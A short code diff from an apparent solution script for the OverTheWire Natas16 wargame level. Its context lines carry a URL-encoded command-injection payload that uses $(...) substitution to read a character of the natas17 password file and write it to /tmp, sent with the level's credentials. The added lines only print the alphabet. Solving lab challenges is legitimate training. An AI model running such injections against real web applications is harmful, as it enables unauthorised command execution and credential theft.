@@ -13,3 +13,5 @@ with open("passwords.txt") as f:
 url = f"http://natas16.natas.labs.overthewire.org/?needle=%24%28echo+%24%28cut+-c8+%2Fetc%2Fnatas_webpass%2Fnatas17%29+%3E+%2Ftmp%2Fthisismytemp.txt%29&submit=Search"
 
 requests.post(url, auth=('natas16', n16_pass))
+
+print(''.join([chr(x) for x in range(65, 65+26)])+''.join([chr(x) for x in range(65+32, 65+26+32)]))
